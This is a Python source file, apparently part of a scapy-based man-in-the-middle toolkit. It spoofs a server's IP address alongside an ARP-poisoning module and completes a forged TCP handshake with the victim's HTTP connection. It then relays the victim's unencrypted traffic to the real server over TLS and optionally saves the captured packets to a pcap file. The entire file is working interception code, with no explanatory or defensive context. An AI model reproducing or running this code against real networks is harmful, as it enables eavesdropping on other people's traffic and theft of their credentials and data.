from scapy.all import *
from scapy_ssl_tls.ssl_tls import *
from arppoison import gethostmac

tls_version = TLSVersion.TLS_1_2
ciphers = [TLSCipherSuite.ECDHE_RSA_WITH_AES_128_GCM_SHA256]
extensions = [TLSExtension() / TLSExtECPointsFormat(), TLSExtension() / TLSExtSupportedGroups()]

def forward(p, port, ipLayerC, ifa, socket):
    answer = socket.do_round_trip(p)
    tcpLayer = TCP(sport = 80, dport = port, seq = p.ack, ack = p.seq + len(p.load), load = answer.load)
    send(ipLayerC / tcpLayer, iface = ifa, verbose = False)
    return p.summary() + "\n" + answer.summary()
        
def startforwarding(ipToSpoof, ifa, timeOut, output):
    attackerMac = gethostmac(ifa)
    print "Listening as " + ipToSpoof

    # SYN from client
    a = sniff(count = 1, filter = "tcp and port 80 and dst host " + ipToSpoof, iface = ifa)
    ipVictim = a[0][IP].src
    port = a[0].sport
    print "Connection from " + ipVictim + ":" + str(port)

    # SYNACK to client
    ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = a[0].seq, ack = a[0].seq + 1)
    send(ipLayerC / synAck, iface = ifa)
    print "Handshake completed"
    print "---------------------"

    with TLSSocket(client = True) as socket:
        # Establish an SSL connection with the server
        socket.connect((ipToSpoof, 443))
        server_hello = socket.do_handshake(tls_version, ciphers, extensions)

        packets = sniff(filter = "tcp and src host " + ipVictim, iface = ifa, timeout = timeOut,
            prn = lambda(p): forward(p, port, ipLayerC, ifa, socket))

        #save sniffed packetsS
        if output:
            wrpcap(output, packets)
